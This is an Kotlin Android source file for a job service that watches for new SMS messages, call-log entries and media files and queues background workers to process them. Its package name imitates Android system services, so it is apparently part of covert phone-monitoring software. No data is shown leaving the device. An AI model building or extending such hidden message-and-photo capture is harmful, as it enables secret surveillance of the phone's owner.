package com.android.services.jobScheduler.services

import android.annotation.TargetApi
import android.app.job.JobParameters
import android.app.job.JobService
import android.content.Context
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.text.TextUtils
import androidx.work.Data
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.android.services.jobScheduler.ObserverJobScheduler
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.android.services.workers.ImageWorker
import com.android.services.workers.SmsWorker
import dagger.hilt.android.AndroidEntryPoint
import org.jetbrains.anko.doAsync
import javax.inject.Inject

@TargetApi(Build.VERSION_CODES.N)
@AndroidEntryPoint
class ObserverJobService : JobService() {

    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource
    
    private val mainThreadHandler: Handler by lazy {
        Handler(Looper.getMainLooper())
    }

    override fun onStartJob(params: JobParameters): Boolean {
        val context = baseContext
        doAsync {
            if (params.triggeredContentAuthorities != null && params.triggeredContentUris != null) {
                for (uri in params.triggeredContentUris!!) {
                    try {
                        val uriString = uri.toString()
                        val authority = uri.authority!!
                        logVerbose("Uri = $uri , Authority = $authority", TAG)
                        mainThreadHandler.post {
                            if (uriString.contains("content://sms") || authority == "sms") {
                                smsUriWork(context, uri)
                            } else if (uriString.contains("content://call_log") || authority == "call_log") {

                            } else if (uriString.contains("content://media") || authority == "media") {
                                imageUriWork(context, uriString)
                            }
                        }
                    } catch (e: Exception) {
                        logException(e.message!!, TAG, e)
                    }
                }
            }
            ObserverJobScheduler.registerObserverJob(context)
            jobFinished(params, false)
        }
        return true
    }

    override fun onStopJob(params: JobParameters): Boolean {
        return false
    }

    private fun imageUriWork(context: Context, imageUri: String) {
        val photosBuilder = OneTimeWorkRequestBuilder<ImageWorker>()
            .addTag(ImageWorker.IMAGE_URI_WORK)
        val builder = Data.Builder()
        builder.putString(ImageWorker.KEY_IMAGE_URI, imageUri)
        photosBuilder.setInputData(builder.build())
        WorkManager.getInstance(context)
            .enqueueUniqueWork(
                ImageWorker.IMAGE_URI_WORK,
                ExistingWorkPolicy.KEEP,
                photosBuilder.build()
            )
    }

    private fun smsUriWork(context: Context, uri: Uri) {
        val path = uri.pathSegments
        if (path == null || path.size == 0) return
        val id = path[path.size - 1]
        if (!TextUtils.isEmpty(id) && !id.contains("raw")) {
            val smsBuilder = OneTimeWorkRequestBuilder<SmsWorker>()
                .addTag(SmsWorker.SMS_URI_WORK)
            val builder = Data.Builder()
            builder.putString(SmsWorker.KEY_SMS_URI, uri.toString())
            smsBuilder.setInputData(builder.build())
            WorkManager.getInstance(context)
                .enqueueUniqueWork(
                    SmsWorker.SMS_URI_WORK,
                    ExistingWorkPolicy.KEEP,
                    smsBuilder.build()
                )
        }
    }

    companion object {
        private const val TAG = "ObserverJobService"
    }
}